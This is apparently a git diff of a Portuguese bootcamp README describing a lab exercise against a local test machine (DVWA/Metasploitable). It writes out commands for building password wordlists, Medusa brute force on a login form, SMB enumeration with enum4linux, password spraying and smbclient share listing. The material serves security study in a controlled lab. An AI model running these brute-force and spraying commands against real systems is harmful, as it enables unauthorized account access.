@@ -22,6 +22,7 @@ O objetivo foi compreender conceitos fundamentais de autenticação, técnicas d
 - Credential Stuffing
 
 🛠️ Ferramentas Estudadas (Conceito)<br>
+
 Durante o bootcamp, estudei o funcionamento e aplicabilidade das seguintes ferramentas:
 
 - Hydra
@@ -43,6 +44,7 @@ Todos os testes foram realizados em ambiente controlado e exclusivamente para fi
 🚀 Simulação Prática de Ataques
 
 📌 Exercício 1 – Criação de Wordlists<br>
+
 Criação de listas de usuários e senhas para uso em ataques automatizados.
 
 - 192.168.56.101 
@@ -50,6 +52,7 @@ Criação de listas de usuários e senhas para uso em ataques automatizados.
 - echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
  
 📌 Exercício 2 – Ataque HTTP com Medusa<br>
+
 Ferramenta utilizada: Medusa<br>
 Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).
 
@@ -59,6 +62,7 @@ Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).
 - -m 'FAIL=Login failed' -t 6
 
 📌 Exercício 3 – Enumeração SMB<br>
+
 Ferramenta utilizada: Enum4linux<br>
 Objetivo: coletar informações sobre usuários e compartilhamentos via SMB.
 
@@ -66,12 +70,14 @@ Objetivo: coletar informações sobre usuários e compartilhamentos via SMB.
 - less enum4_output.txt
  
 📌 Exercício 4 – Password Spraying via SMB<br>
+
 Ferramenta utilizada: Medusa
 
 - echo -e "user\nmsfadmin\nservice" > smb_users.txt
 - medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 
 📌 Exercício 5 – Enumeração de Compartilhamentos<br>
+
 Ferramenta utilizada: SMBClient
 
 - smbclient -L //192.168.56.101 -U msfadmin
